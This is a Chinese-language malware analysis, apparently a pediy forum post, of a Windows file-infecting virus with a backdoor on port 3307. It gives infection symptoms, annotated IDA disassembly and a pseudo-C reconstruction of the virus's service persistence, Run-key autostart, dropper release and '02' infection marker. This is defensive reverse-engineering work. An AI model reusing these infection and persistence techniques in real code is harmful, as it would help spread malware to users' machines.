
# 某感染型病毒分析

> 原文：[`www.pediy.com/kssd/pediy09/pediy09-734.htm`](https://www.pediy.com/kssd/pediy09/pediy09-734.htm)

> 【工具】: `IDA 5.0`
> 【任务】: 病毒分析以及解决方案
> 【操作平台】: `Windows 2003 server`
> 【作者】: `LoveBoom[DFCG][FCG][CUG]`
> 【链接】: N/A
> 【简要说明】: 这是前段时间收到的一病毒样本，正好这两天有时间。细细的分析了一下，这个病毒是 Windows 平台的感染型病毒，病毒运行后会感染机器上的所有可执行文件(仅 PE 文件),感染后在中毒后机器上开启后门，以方便病毒作者控制中毒的机器。
> 【病毒分析】:
>
> 和以前一样，先看看中毒后的几个表象:
>
> 1、可见 `%System%\1021\services.exe` 文件，文件大小为: 65536 Byte；
>
> 2、观察注册表项可见以下可疑注册表自启动项(仅针对 Win9x):
>
> `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
>
> 键值: `"ckass" = %System%\1021\services.exe`
>
> 3、如果 `"%Windir%\css"` 文件存在时,可见 `"%Windir%\InetInfo.exe"`,并多出以下注册表自启动项(仅针对于 Win9x):
>
> `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run`
>
> 键值: `"InetInfo" = %Windir%\InetInfo.exe`
>
> 4、机器开放 TCP 和 UDP 的连接，连接端口为: 3307;
>
> 5、如果中毒后的机器 A 盘不可用则病毒会跳出错误提示: `"驱动器中没有软盘。请在驱动器 A：中插入软盘"`
>
> 6、查看服务时会发现以下可疑的服务(WinNt 内核):
>
> - 服务名: `services`
> - 服务描述: `Themes Plug and Play`
> - 启动类型: 自动
> - 路径: `%system%\1021\services.exe`
>
> 如果上面的条件都符合你那么恭喜你，你中彩了。下面来看看病毒具体做了些什么，由于病毒同时感染 Win9x 和 Winnt 系统，因此这次没整理出病毒的流程,各位看官就跟着代码一起往下看吧。病毒本身是用标准的 C 编写，因此我直接定位到 `WinMain` 处进行分析(使用 `ida` 分析时 `ida` 能够解析出该位置):
>
> ```asm
> .rsrc:0040800A _WinMain@16 proc near             ; CODE XREF: start+C9 p
> .rsrc:0040800A          jmp     sub_408020
> ......
> ```
>
> 病毒一进来就进行操作系统判断，然后设置相应的标记:
>
> ```asm
> .rsrc:0040807A          push    offset szWinDir           ; lpBuffer
> .rsrc:0040807F          call    ds:GetWindowsDirectoryA
> .rsrc:00408085          mov     eax, ds:flg_OS
> .rsrc:0040808A          test    eax, eax
> .rsrc:0040808C          jnz     loc_408114                ; 如果不是 Winnt 系统则不跳
> .rsrc:00408092          mov     edi, offset Buffer
> ......
> .rsrc:004080F7          dec     ecx
> .rsrc:004080F8          lea     eax, [ebp+FileName]       ; 如果是 Win9x 系统则病毒释放病毒原体为:
> .rsrc:004080F8                                  ; %System%\1021\services.exe
> .rsrc:004080FE          push    ecx                     ; cbData
> .rsrc:004080FF          push    eax                     ; lpData
> .rsrc:00408100          push    1                       ; int
> .rsrc:00408102          push    offset ValueName        ; "ckass"
> .rsrc:00408107          push    offset aSoftwareMicros  ; hKey
> .rsrc:0040810C          call    WriteReg                ; 这里先将病毒写入注册表自启动项(这一步还没有生成病毒原体):
> .rsrc:0040810C                                  ; 主键:HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
> .rsrc:0040810C                                  ; 键值:"ckass" = %System%\1021\services.exe
> .rsrc:00408111          add     esp, 14h
> .rsrc:00408114
> .rsrc:00408114 loc_408114:                         ; CODE XREF: sub_408020+6C j
> .rsrc:00408114          lea     ecx, [ebp+FileName]
> .rsrc:0040811A          push    7FFh                ; nSize
> .rsrc:0040811F          push    ecx                 ; lpFilename
> .rsrc:00408120          push    0                   ; hModule
> .rsrc:00408122          call    ds:GetModuleFileNameA ; 获取程序进程名
> .rsrc:00408128          lea     edx, [ebp+WSAData]
> .rsrc:0040812E          push    edx                 ; lpWSAData
> .rsrc:0040812F          push    101h                ; wVersionRequested
> .rsrc:00408134          call    ds:WSAStartup       ; 连接网络
> .rsrc:0040813A          lea     eax, [ebp+FileName]
> .rsrc:00408140          push    eax                 ; lpFileName
> .rsrc:00408141          call    Init_Virus          ; 这里进去病毒判断是否为病毒原体。
> .rsrc:00408141                                  ; 如果不是病毒原体则释放出原体
> .rsrc:00408146          add     esp, 4
> .rsrc:00408149          test    al, al
> .rsrc:0040814B          jz      short loc_408171
> .rsrc:0040814D          mov     eax, ds:flg_OS
> .rsrc:00408152          test    eax, eax
> .rsrc:00408154          jnz     short loc_40817A     ; 如果是 Win9x 系统则病毒执行如下命令:
> .rsrc:00408154                                  ; shell %system%\1021\services.exe /autorun
> .rsrc:00408156          push    0                   ; nShowCmd
> .rsrc:00408158          push    0                   ; lpDirectory
> .rsrc:0040815A          push    offset Parameters   ; "/autorun"
> .rsrc:0040815F          push    offset unk_4144A8   ; lpFile
> .rsrc:00408164          push    offset Operation    ; "open"
> .rsrc:00408169          push    0                   ; hwnd
> .rsrc:0040816B          call    ds:ShellExecuteA    ; Opens or prints a specified fil
> ......
> .rsrc:00408180          push    offset unk_4144A8
> .rsrc:00408185          push    ecx
> .rsrc:00408186          call    strcmp_             ; 这里判断自身是否为
> .rsrc:00408186                                  ; %system%\1021\services.exe
> .rsrc:00408186                                  ; 判断相应的文件是否已经感染了病毒
> .rsrc:0040818B          add     esp, 8
> .rsrc:0040818E          test    eax, eax
> .rsrc:00408190          jnz     short loc_4081BA    ; 如果不是则跳
> .rsrc:00408192          lea     edx, [ebp+ServiceStartTable]
> .rsrc:00408195          mov     [ebp+ServiceStartTable.lpServiceName], offset ServiceName ; "services"
> .rsrc:0040819C          push    edx                 ; lpServiceStartTable
> .rsrc:0040819D          mov     [ebp+ServiceStartTable.lpServiceProc], offset loc_40B370
> .rsrc:004081A4          mov     [ebp+var_8], eax
> .rsrc:004081A7          mov     [ebp+var_4], eax
> .rsrc:004081AA          call    ds:StartServiceCtrlDispatcherA ; 如果是病毒本身则启动病毒 服务
> .rsrc:004081B0          xor     eax, eax
> .rsrc:004081B2          pop     edi
> .rsrc:004081B3          pop     esi
> .rsrc:004081B4          mov     esp, ebp
> .rsrc:004081B6          pop     ebp
> .rsrc:004081B7          retn    10h
> .rsrc:004081BA ; ---------------------------------------------------------------------------
> .rsrc:004081BA
> .rsrc:004081BA loc_4081BA:                         ; CODE XREF: sub_408020+158 j
> .rsrc:004081BA                                  ; sub_408020+170 j
> .rsrc:004081BA          call    Shell_Other_body    ; 运行%Windir%\INETINFO.exe，并将其加入注册表自启动项，
> .rsrc:004081BA                                  ; 加入的条件是%Windir%\css 文件必须存在，
> .rsrc:004081BA                                  ; 存在后病毒将 css 文件复制为 inetinfo.exe,然后运行之
> ......
> .rsrc:004081C8          push    400F003Fh           ; dwDesiredAccess
> .rsrc:004081CD          push    0                   ; lpDatabaseName
> .rsrc:004081CF          push    0                   ; lpMachineName
> .rsrc:004081D1          call    ds:OpenSCManagerA   ; Establish a connection to the service
> .rsrc:004081D1                                  ; control manager on the specified computer
> .rsrc:004081D1                                  ; and opens the specified database
> .rsrc:004081D7          mov     ds:hSCObject, eax
> .rsrc:004081DC          call    QueryServiceStat    ; 检查病毒服务是否已经启动
> .rsrc:004081E1          test    al, al
> .rsrc:004081E3          jnz     short Server_is_active ; 如果服务已经启动则跳
> .rsrc:004081E5          call    QueryService        ; 判断服务是否存在
> .rsrc:004081EA          test    al, al
> .rsrc:004081EC          jnz     short server_already_setup ; 如果服务已经安装则跳
> .rsrc:004081EE          call    Createvirusser      ; 创建病毒服务
> .rsrc:004081F3
> .rsrc:004081F3 server_already_setup:               ; CODE XREF: sub_408020+1CC j
> .rsrc:004081F3          call    Shell_Services      ; 启动病毒服务
> .rsrc:004081F8
> .rsrc:004081F8 Server_is_active:                  ; CODE XREF: sub_408020+1C3 j
> .rsrc:004081F8          mov     eax, ds:hSCObject
> ```



### 主流程分析

以下汇编代码展示了病毒主流程的关键部分：

```asm
.rsrc:004081FD      mov     esi, ds:CloseServiceHandle
.rsrc:00408203      push    eax             ; hSCObject
......
.rsrc:0040820F
.rsrc:0040820F loc_40820F:                  ; CODE XREF: sub_408020+21B j
.rsrc:0040820F        call    Release_File      ; 还原并加载感染前文件
.rsrc:00408214        test    eax, eax
.rsrc:00408216        mov     [ebp+pOEP], eax
.rsrc:00408219        jz      short loc_40821E
.rsrc:0040821B        call    [ebp+pOEP]
.rsrc:0040821E
.rsrc:0040821E loc_40821E:                  ; CODE XREF: sub_408020+1F9 j
.rsrc:0040821E        pop     edi
.rsrc:0040821F        xor     eax, eax
.rsrc:00408221        pop     esi
.rsrc:00408222        mov     esp, ebp
.rsrc:00408224        pop     ebp
.rsrc:00408225        retn    10h
.rsrc:00408228 ; ---------------------------------------------------------------------------
.rsrc:00408228
.rsrc:00408228 Win9xWay_408228:             ; CODE XREF: sub_408020+1A6 j
.rsrc:00408228        mov     edx, [ebp+pOEP]
.rsrc:0040822B        push    offset Parameters     ; "/autorun"
.rsrc:00408230        push    edx
.rsrc:00408231        call    strcmp_
.rsrc:00408236        add     esp, 8
.rsrc:00408239        test    eax, eax
.rsrc:0040823B        jnz     short loc_40820F      
.rsrc:0040823D        mov     esi, ds:CreateThread
.rsrc:00408243        push    eax             ; lpThreadId
.rsrc:00408244        push    eax             ; dwCreationFlags
.rsrc:00408245        push    eax             ; lpParameter
.rsrc:00408246        push    offset Infect_Drivers   ; lpStartAddress
.rsrc:0040824B        push    eax             ; dwStackSize
.rsrc:0040824C        push    eax             ; lpThreadAttributes
.rsrc:0040824D        call    esi ; CreateThread      ; 启动感染本地文件线程
.rsrc:0040824F        push    0               ; lpThreadId
.rsrc:00408251        push    0               ; dwCreationFlags
.rsrc:00408253        push    0               ; lpParameter
.rsrc:00408255        push    offset Server           ; lpStartAddress
.rsrc:0040825A        push    0               ; dwStackSize
.rsrc:0040825C        push    0               ; lpThreadAttributes
.rsrc:0040825E        call    esi ; CreateThread      ; 启动设置后门线程
.rsrc:00408260        mov     esi, ds:Sleep
.rsrc:00408266
.rsrc:00408266 loc_408266:                  ; CODE XREF: sub_408020+24D j
.rsrc:00408266        push    600000              ; dwMilliseconds
.rsrc:0040826B        call    esi ; Sleep
.rsrc:0040826D        jmp     short loc_408266        ; 到这里实际上已经结束了，实际这里病毒用个 sleep,-1 即可
.rsrc:0040826D sub_408020 endp
```

到这里为此病毒的主流程就结束了，总的来说还是很简单的，下面将以上代码转成 `C` 以方便理解（是类 `C` 哦，之所以说是类 `C` 是因为下面的代码是我自己按理解的方式写成 `C` 的，按照标准的方法可能是有语法错误的）:

```c
// 获取系统版本信息
if (flg_OS == Win9x) {
    szservices = %system%\1021\services.exe;
    WriteReg(HKLM, "software\\..\\run", ""ckass", reg_sz, szservices, len(szservices) + 1);
}
GetModuleFileNameA(GetModuleHandleA(NULL), szAppFullName, MAX_PATH);
WSAStartup(0x101, buffer);
nRetCode = Init_Virus(arg1);
if (nRetCode) {
    if (flg_OS == Win9x) {
        ShellExecute(NULL, "open", "%system%\1021\services.exe /autorun", NULL, NULL);
    }
}

if (flg_OS == WinNT) {
    nRetCode = strcmp_(arg1, arg2);
    if (!nRetCode) {
        StartServiceCtrlDispatcher(arg1);
        return 0;
    }
}
Shell_Other_body();
if (flg_OS == WinNT) {
    hScobject = OpenSCManager(NULL, NULL, desiresAccess);
    nRetCode = QueryServicestatus();
    if (!nRetCode) {
        nRetCode = QueryService();
        if (!nRetCode) {
            // 安装服务
            Createvirusservice();
        }
        Shell_Services();
    }
    CloseServicehandle(hScobject);
    CloseServicehandle(arg1);

lbl_Release_File:
    DWORD uEP = Release_file();    // 还原出感染前的文件
    if (uEP) {
        call uEP
    }
    Return 0;
} else {
    if (strcmp_(arg1, arg2)) // 判断是病毒原体还是感染后文件,是感染后文件则跳去还原原文件
        goto lbl_Release_File;
    CreateThread(NULL, NULL, pInfect_Drivers, NULL, NULL, NULL);  // 启动感染文件线程
    CreateThread(NULL, NULL, pServer, NULL, NULL, NULL);    // 启动开启后门线程

lbl_Loop:
    Sleep(60000);
    goto lbl_Loop;
}
```

### 核心函数列表

通过上面 `C` 代码的总结，可以得知病毒调用了以下几个函数（函数的相关说明参见相应的汇编代码分析）：

- `Init_Virus`
- `Shell_Other_body`
- `Createvirusser`
- `Shell_Services`
- `Release_File`
- `Infect_Drivers`
- `Server`

这几个函数中，其中 `Server` 是在本地开放 `TCP` 和 `UDP` 连接，连接端口为 `3307`，代码比较杂，我没有去细分析，因此这部分后面不再陈述。下面来分别来看看除 `server` 之外的其它几个函数都做了些什么：

### Init_Virus 分析

`Init_Virus` 负责初始化病毒环境，主要逻辑包括创建目录和检查文件属性。

```asm
.rsrc:00409320 ; ================ S U B R O U T I N E ===============
.rsrc:00409320
.rsrc:00409320
.rsrc:00409320 ; int __cdecl Init_Virus(LPCSTR lpFileName)
.rsrc:00409320 Init_Virus proc near                ; CODE XREF: sub_408020+121 p
......
.rsrc:0040937A        call    ds:GetFileAttributesA
.rsrc:00409380        cmp     eax, -1             ; 判断%system%\1021 文件夹是否存在
.rsrc:00409383        mov     ds:dwFileAttributes, eax
.rsrc:00409388        jnz     short loc_4093A1
.rsrc:0040938A
.rsrc:0040938A loc_40938A:                  ; CODE XREF: Init_Virus+93 j
.rsrc:0040938A        push    0               ; lpSecurityAttributes
.rsrc:0040938C        push    offset unk_4144A8       ; lpPathName
.rsrc:00409391        call    ds:CreateDirectoryA     ; 如果不存在则创建该文件夹
.rsrc:00409397        test    eax, eax
.rsrc:00409399        jnz     short loc_4093BB        ; 创建文件夹失败则 over
.rsrc:0040939B        pop     edi
......
.rsrc:004093E6        rep movsb
.rsrc:004093E8        call    chk_servicesfile        ; 判断%system%\1021\services.exe 文件是否存在，
.rsrc:004093E8                                            ; 以及是否为有病毒原体本身.
.rsrc:004093E8                                            ; 病毒判断是否为病毒本身的方法:
.rsrc:004093E8                                            ; 判断文件尾部两字节是否为 02
.rsrc:004093E8                                            ; 如果是 02 则病毒是当前病毒原体，如果不是则停止病毒服务，
.rsrc:004093E8                                            ; 删除 services.exe 文件.
.rsrc:004093E8                                            ; 同时这也是用于删除旧版本的病毒体。
.rsrc:004093ED        mov     eax, [esp+0Ch+lpFileName]
......
.rsrc:0040941C        mov     edi, ds:SetFileAttributesA
.rsrc:00409422        push    80h             ; dwFileAttributes
.rsrc:00409427        push    offset unk_4144A8       ; lpFileName
.rsrc:0040942C        call    edi ; SetFileAttributesA ; 设置%system%\1021\services.exe 文件属性为 normal
.rsrc:0040942E        push    0               ; hTemplateFile
.rsrc:00409430        push    80000087h       ; dwFlagsAndAttributes
.rsrc:00409435        push    2               ; dwCreationDisposition
.rsrc:00409437        push    0               ; lpSecurityAttributes
.rsrc:00409439        push    3               ; dwShareMode
.rsrc:0040943B        push    0C0000000h      ; dwDesiredAccess
.rsrc:00409440        push    offset unk_4144A8       ; lpFileName
.rsrc:00409445        call    esi ; CreateFileA       ; 打开%system%\1021\services.exe
.rsrc:00409447        cmp     eax, 0FFFFFFFFh
.rsrc:0040944A        mov     ds:hFileServices, eax
.rsrc:0040944F        jnz     short loc_409463
.rsrc:00409451        push    87h             ; dwFileAttributes
```



### `Init_Virus` 函数分析

```assembly
.rsrc:00409456    push    offset unk_4144A8       ; lpFileName
.rsrc:0040945B    call    edi ; SetFileAttributesA ; 设置文件属性为 normal
.rsrc:0040945D    pop     edi
...
.rsrc:0040946A    push    0                       ; lpFileSizeHigh
.rsrc:0040946C    push    ecx                     ; hFile
.rsrc:0040946D    call    ds:GetFileSize          ; 获取病毒原体的大小
.rsrc:00409473    mov     edx, ds:pheap
.rsrc:00409479    push    eax                     ; dwBytes
.rsrc:0040947A    push    8                       ; dwFlags
.rsrc:0040947C    push    edx                     ; hHeap
.rsrc:0040947D    mov     ds:lDistanceToMove, eax
.rsrc:00409482    call    ds:HeapAlloc            ; 申请文件大小大的内存空间
.rsrc:00409488    mov     edx, ds:lDistanceToMove
.rsrc:0040948E    lea     ecx, [esp+10h+NumberOfBytesRead]
.rsrc:00409492    push    0                       ; lpOverlapped
.rsrc:00409494    push    ecx                     ; lpNumberOfBytesRead
.rsrc:00409495    push    edx                     ; nNumberOfBytesToRead
.rsrc:00409496    mov     ds:lpBaseAddress, eax
.rsrc:0040949B    push    eax                     ; lpBuffer
.rsrc:0040949C    mov     eax, ds:hFileApp
.rsrc:004094A1    push    eax                     ; hFile
.rsrc:004094A2    call    ds:ReadFile             ; 将文件内容读取至内存
.rsrc:004094A8    call    Release_Virus_Body      ; 如果是感染后文件则释放出病毒原体
.rsrc:004094AD    test    al, al
.rsrc:004094AF    jnz     short loc_4094BE
.rsrc:004094B1    call    sub_4092C0              ; 写入感染标记
.rsrc:004094B6    test    al, al
.rsrc:004094B8    jnz     short loc_4094BE
...
.rsrc:004094EA    push    ecx                     ; hObject
.rsrc:004094EB    call    esi ; CloseHandle
.rsrc:004094ED    push    FILE_ATTRIBUTE_READONLY or FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM or FILE_ATTRIBUTE_NORMAL ; dwFileAttributes
.rsrc:004094F2    push    offset unk_4144A8       ; lpFileName
.rsrc:004094F7    call    edi ; SetFileAttributesA ; 设置病毒原体文件属性
...
.rsrc:004094FD    pop     esi
.rsrc:004094FE    pop     ecx
.rsrc:004094FF    retn
.rsrc:004094FF Init_Virus endp
```

在`Init_Virus`函数中又调用了以下两个函数，跟进来看看这两个函数又做了什么：

### `chk_servicesfile` 函数

```assembly
chk_servicesfile:

.rsrc:00409890 ;=============== S U B R O U T I N E =======================================
.rsrc:00409890
.rsrc:00409890
.rsrc:00409890 chk_servicesfile proc near            ; CODE XREF: Init_Virus+C8 p
.rsrc:00409890
...
.rsrc:004098A2    push    80000000h                   ; dwDesiredAccess
.rsrc:004098A7    push    offset unk_4144A8           ; lpFileName
.rsrc:004098AC    call    ds:CreateFileA              ; 只读方式打开%System%\1021\services.exe 文件
.rsrc:004098B2    cmp     eax, -1
.rsrc:004098B5    mov     ds:hFileServices, eax
.rsrc:004098BA    jz      end
.rsrc:004098C0    push    0                           ; lpFileSizeHigh
.rsrc:004098C2    push    eax                         ; hFile
.rsrc:004098C3    call    ds:GetFileSize
.rsrc:004098C9    mov     ds:nNumberOfBytesToRead, eax
.rsrc:004098CE    push    FILE_BEGIN                  ; dwMoveMethod
.rsrc:004098D0    add     eax, -2
.rsrc:004098D3    push    0                           ; lpDistanceToMoveHigh
.rsrc:004098D5    push    eax                         ; lDistanceToMove
.rsrc:004098D6    mov     eax, ds:hFileServices
.rsrc:004098DB    push    eax                         ; hFile
.rsrc:004098DC    call    ds:SetFilePointer           ; 读取文件尾最后两字节
.rsrc:004098E2    mov     eax, ds:hFileServices
.rsrc:004098E7    lea     ecx, [esp+4Ch+NumberOfBytesRead]
.rsrc:004098EB    push    0                           ; lpOverlapped
.rsrc:004098ED    push    ecx                         ; lpNumberOfBytesRead
.rsrc:004098EE    lea     edx, [esp+54h+Buffer]
.rsrc:004098F2    push    2                           ; nNumberOfBytesToRead
.rsrc:004098F4    push    edx                         ; lpBuffer
.rsrc:004098F5    push    eax                         ; hFile
.rsrc:004098F6    call    ds:ReadFile                 ; 读取文件尾最后两字节
.rsrc:004098FC    mov     ecx, ds:hFileServices
.rsrc:00409902    push    ecx                         ; hObject
.rsrc:00409903    call    ds:CloseHandle
.rsrc:00409909    mov     ax, word ptr [esp+4Ch+Buffer]
.rsrc:0040990E    cmp     al, '0'
.rsrc:00409910    jl      short loc_409940
.rsrc:00409912    cmp     al, '9'
.rsrc:00409914    jg      short loc_409940
.rsrc:00409916    cmp     ah, '0'
.rsrc:00409919    jl      short loc_409940
.rsrc:0040991B    cmp     ah, 39h
.rsrc:0040991E    jg      short loc_409940
.rsrc:00409920    movsx   edx, byte ptr ds:a02+1
.rsrc:00409927    movsx   ecx, byte ptr ds:a02        ; "02"
.rsrc:0040992E    add     edx, ecx
.rsrc:00409930    movsx   ecx, ah
.rsrc:00409933    movsx   eax, al
.rsrc:00409936    add     ecx, eax
.rsrc:00409938    cmp     ecx, edx
.rsrc:0040993A    jge     end                         ; 如果文件尾最后两字节大于或等于 02 表示病毒已经感染或者
                                                      ; 已经是当前最新版本
.rsrc:00409940
.rsrc:00409940 loc_409940:                             ; CODE XREF: chk_servicesfile+80 j
                                                      ; chk_servicesfile+84 j ...
.rsrc:00409940    push    0                           ; protocol
.rsrc:00409942    push    1                           ; type
.rsrc:00409944    push    2                           ; af
.rsrc:00409946    mov     byte ptr [esp+58h+Buffer+2], 7Fh
.rsrc:0040994B    mov     byte ptr [esp+58h+Buffer+3], 0
.rsrc:00409950    mov     [esp+58h+var_3E], 0         ; 如果不为 02 则表示为低版本或者不是该病毒，病毒通过
                                                      ; 网络下载新版的病毒。
.rsrc:00409955    mov     [esp+58h+var_3D], 1         ; 那当然这个可能是病毒作者未完成的模块，因为这里并没有
                                                      ; 写上病毒真正连接地址。或者病毒通过后门连接后放到本地
                                                      ; 然后这里下载。
.rsrc:0040995A    call    ds:socket
.rsrc:00409960    mov     esi, eax
...
.rsrc:004099D0    push    eax                         ; hService
.rsrc:004099D1    call    ds:ControlService           ; Send a control code to a Win32 service
.rsrc:004099D7    test    eax, eax                    ; 停止 services 服务
.rsrc:004099D9    jz      short end
.rsrc:004099DB
.rsrc:004099DB loc_4099DB:                             ; CODE XREF: chk_servicesfile+195 j
.rsrc:004099DB    call    Del_Service_File            ; 停止服务，删除 services.exe 文件
.rsrc:004099E0
.rsrc:004099E0 end:                                     ; CODE XREF: chk_servicesfile+2A j
                                                      ; chk_servicesfile+AA j ...
.rsrc:004099E0    pop     edi
.rsrc:004099E1    pop     esi
.rsrc:004099E2    add     esp, 44h
.rsrc:004099E5    retn
.rsrc:004099E6 ;---------------------------------------------------------------------------
.rsrc:004099E6
.rsrc:004099E6 loc_4099E6:                             ; CODE XREF: chk_servicesfile+106 j
.rsrc:004099E6    test    esi, esi
.rsrc:004099E8    jz      short loc_40999F
```



## .rsrc:004099EA

```
mov     edi, ds:send
push    0                           ; flags
lea     eax, [esp+50h+buf]
push    8                           ; len
push    eax                         ; buf
push    esi                         ; s
mov     dword ptr [esp+5Ch+buf], 4
mov     [esp+5Ch+var_34], 0FFFF000Dh
call    edi ; send
push    0                           ; flags
lea     ecx, [esp+50h+buf]
push    8                           ; len
push    ecx                         ; buf
push    esi                         ; s
call    ds:recv
mov     eax, [esp+4Ch+var_34]
cmp     eax, 0FFFF000Dh
jz      short loc_4099DB            ; 停止服务，删除 services.exe 文件
cmp     eax, 0FFFF000Ch
jnz     loc_40999F
push    0                           ; flags
lea     edx, [esp+50h+buf]
push    8                           ; len
push    edx                         ; buf
push    esi                         ; s
mov     dword ptr [esp+5Ch+buf], 4
mov     [esp+5Ch+var_34], 0FFFF0002h
call    edi ; send
push    esi                         ; s
call    ds:closesocket
pop     edi
pop     esi
add     esp, 44h
retn
chk_servicesfile endp
```

### .rsrc:00409A5A

`chk_servicesfile`函数用于判断`%system%\1021`目录下的`services.exe`文件是否为病毒本身，不是则下载病毒替换旧版本或者非病毒的该文件。接下来看看`Release_Virus_Body`:

```
.rsrc:004090A0 Release_Virus_Body proc near            ; CODE XREF: Init_Virus+188 p
.rsrc:004090A0
......
.rsrc:004090AC     push    esi
.rsrc:004090AD     mov     eax, [edx+IMAGE_DOS_HEADER.e_lfanew]
.rsrc:004090B0     push    edi
.rsrc:004090B1     add     eax, edx
.rsrc:004090B3     mov     cx, [eax+IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
.rsrc:004090B7     lea     ecx, [ecx+ecx*4]
.rsrc:004090BA     mov     esi, [eax+ecx*8+0D8h]   ; 获取最后一个节的 Vsize
.rsrc:004090C1     mov     edi, [eax+ecx*8+0E4h]   ; 获取最一个节 Roffset
.rsrc:004090C8     lea     ecx, [eax+ecx*8+0D0h]   ; 将 pLastSec 传给 ecx
.rsrc:004090CF     add     edi, esi                ; Roffset + Vsize
.rsrc:004090D1     lea     ebx, [edi+edx-1008h]    ; pVirusBody = (pmem + (Roffset + Vsize)) - 1008h
.rsrc:004090D8     mov     edx, [eax+IMAGE_NT_HEADERS.OptionalHeader.ImageBase] ; 获取 ImgBase
.rsrc:004090DB     mov     eax, [ecx+IMAGE_SECTION_HEADER.VirtualAddress] ; 将最后一个节 Rva 保存到 eax 中
.rsrc:004090DE     mov     [esp+28h+ImgBase], edx
.rsrc:004090E2     lea     ecx, [eax+esi-10E8h]    ; 最后一个节 Rva + Vsize - 10e8h
.rsrc:004090E9     mov     eax, [ebx+IMAGE_DOS_HEADER.e_lfanew] ; 定位病毒原体的 pe 头
.rsrc:004090EC     cmp     eax, 1000h
.rsrc:004090F1     mov     [esp+28h+nSizeOfImgBase], ecx
.rsrc:004090F5     jbe     short loc_409100        ; 如果原病毒体 pe 位置大于 0x1000 则 over
.rsrc:004090F7     pop     edi
.rsrc:004090F8     pop     esi
.rsrc:004090F9     xor     al, al
.rsrc:004090FB     pop     ebx
.rsrc:004090FC     add     esp, 1Ch
.rsrc:004090FF     retn
.rsrc:00409100 ; ---------------------------------------------------------------------------
.rsrc:00409100
.rsrc:00409100 loc_409100:                       ; CODE XREF: Release_Virus_Body+55 j
.rsrc:00409100     mov     esi, [eax+ebx]
.rsrc:00409103     xor     ecx, ecx
.rsrc:00409105     mov     cx, [eax+ebx+IMAGE_NT_HEADERS.FileHeader.NumberOfSections]
.rsrc:0040910A     lea     edx, [eax+ebx+0F8h]     ; edx 为第一个节所在的位置 pSecHdr
.rsrc:00409111     mov     [esp+28h+Vir_nSecNum], ecx
.rsrc:00409115     cmp     esi, 'EP'               ; 判断是否为有效的 pe 文件
.rsrc:0040911B     lea     ecx, [ecx+ecx*4]
.rsrc:0040911E     lea     edi, [eax+ebx+18h]
.rsrc:00409122     lea     ecx, [edx+ecx*8-28h]
.rsrc:00409126     jz      short loc_409131        ; 定位到病毒体最后一个节
.rsrc:00409128     pop     edi
.rsrc:00409129     pop     esi
.rsrc:0040912A     xor     al, al
.rsrc:0040912C     pop     ebx
.rsrc:0040912D     add     esp, 1Ch
.rsrc:00409130     retn
.rsrc:00409131 ; ---------------------------------------------------------------------------
.rsrc:00409131
......
src:0040925A       push    edx                   ; lpNumberOfBytesWritten
.rsrc:0040925B       push    esi                   ; nNumberOfBytesToWrite
.rsrc:0040925C       push    eax                   ; lpBuffer
.rsrc:0040925D       push    ecx                   ; hFile
.rsrc:0040925E       call    edi ; WriteFile       ; 写入病毒原体文件
.rsrc:00409260       mov     edx, ds:lpBuffer
......
.rsrc:0040929E       push    2                   ; nNumberOfBytesToWrite
.rsrc:004092A0       push    offset a02           ; "02"
.rsrc:004092A5       push    edx                   ; hFile
.rsrc:004092A6       call    edi ; WriteFile       ; 写入感染标记 02
.rsrc:004092A8       pop     edi
.rsrc:004092A9       pop     esi
.rsrc:004092AA       mov     al, 1
.rsrc:004092AC       pop     ebx
.rsrc:004092AD       add     esp, 1Ch
.rsrc:004092B0       retn
.rsrc:004092B0 Release_Virus_Body endp
.rsrc:004092B0
.rsrc:004092B0 ; ---------------------------------------------------------------------------
```

这部分就是病毒对于感染后文件的释放病毒原体的过程,病毒本身大概是这样做的:

在感染文件前将病毒的ＰＥ头信息保存在要感染的文件中(保存在最后一个节)，然后感染文件。运行感染后的文件时，病毒读取保存的病毒ＰＥ头信息，然后根据头部信息还原出病毒原体，还原出原体后写上感染标记 02,以防止病毒感染自身。

### .rsrc:00408310

看完释放原体部分后回到第一层看看`Shell_other_body`函数:

```
.rsrc:00408310 ;=============== S U B R O U T I N E =================================
.rsrc:00408310
.rsrc:00408310
.rsrc:00408310 Shell_Other_body_01 proc near            ; CODE XREF: Shell_Other_body j
.rsrc:00408310
......
.rsrc:004083CF       and     ecx, 3
.rsrc:004083D2       push    eax                   ; lpFileName
.rsrc:004083D3       rep movsb
.rsrc:004083D5       call    ds:SetFileAttributesA ; 设置%Windir%\INETINFO.exe 文件属性为 normal
.rsrc:004083DB       push    ebp                   ; hTemplateFile
.rsrc:004083DC       push    FILE_ATTRIBUTE_READONLY or FILE_ATTRIBUTE_HIDDEN or FILE_ATTRIBUTE_SYSTEM or FILE_ATTRIBUTE_NORMAL ; dwFlagsAndAttributes
.rsrc:004083E1       push    2                   ; dwCreationDisposition
.rsrc:004083E3       push    ebp                   ; lpSecurityAttributes
.rsrc:004083E4       mov     esi, ds:CreateFileA
.rsrc:004083EA       push    3                   ; dwShareMode
.rsrc:004083EC       lea     ecx, [esp+82Ch+Data]
.rsrc:004083F0       push    0C0000000h            ; dwDesiredAccess
.rsrc:004083F5       push    ecx                   ; lpFileName
```



```
.rsrc:004083F6     call    esi ; CreateFileA       ; 打开%Windir%\INETINFO.exe 文件,带写和读属性
.rsrc:004083F8     mov     ebx, eax
.rsrc:004083FA     cmp     ebx, 0FFFFFFFFh
.rsrc:004083FD     jnz     short loc_40840F
......
.rsrc:00408481     or      ecx, 0FFFFFFFFh
.rsrc:00408484     xor     eax, eax
.rsrc:00408486     repne scasb               ; 如果%Windir%\css 文件存在则将该文件内容替换
                                             ; InetInfo.exe 文件的文件内容，其实就是替换文件操作
.rsrc:00408488     not     ecx
.rsrc:0040848A     dec     ecx
.rsrc:0040848B     lea     eax, [esp+818h+Data]
.rsrc:0040848F     push    ecx               ; cbData
.rsrc:00408490     push    eax               ; lpData
.rsrc:00408491     push    1                 ; int
.rsrc:00408493     push    offset aInetinfo    ; "InetInfo"
.rsrc:00408498     push    offset aSoftwareMicros  ; hKey
.rsrc:0040849D     call    WriteReg          ; 替换完毕后将 inetinfo.exe 写入注册表自启动项中
.rsrc:004084A2     add     esp, 14h
.rsrc:004084A5     mov     edi, 1
.rsrc:004084AA     jmp     short loc_4084B0
......
